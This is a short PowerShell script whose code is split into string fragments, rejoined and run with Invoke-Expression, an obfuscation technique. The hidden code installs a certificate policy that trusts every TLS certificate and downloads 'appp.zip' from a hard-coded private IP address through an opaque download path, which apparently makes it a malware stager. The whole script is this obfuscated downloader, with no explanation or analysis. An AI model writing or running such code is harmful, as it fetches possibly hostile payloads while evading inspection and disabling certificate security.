$fragments = @('Add-Type @"
usi','ng System.Net;
','using System.Se','curity.Cryptogr','aphy.X509Certif','icates;

public',' class TrustAll','CertsPolicy : I','CertificatePoli','cy {
    public',' bool CheckVali','dationResult(
 ','       ServiceP','oint srvPoint, ','X509Certificate',' certificate,
 ','       WebReque','st request, int',' certificatePro','blem) {
       ',' return true;
 ','   }
}
"@

[Sys','tem.Net.Service','PointManager]::','CertificatePoli','cy = New-Object',' TrustAllCertsP','olicy

Invoke-W','ebRequest -Uri ','"https://192.16','8.248.131:7443/','direct/download','/265129df-eb2d-','4f4a-91d0-fd5a3','a9cc429" -OutFi','le "appp.zip"
'); $script = $fragments -join ''; Invoke-Expression $script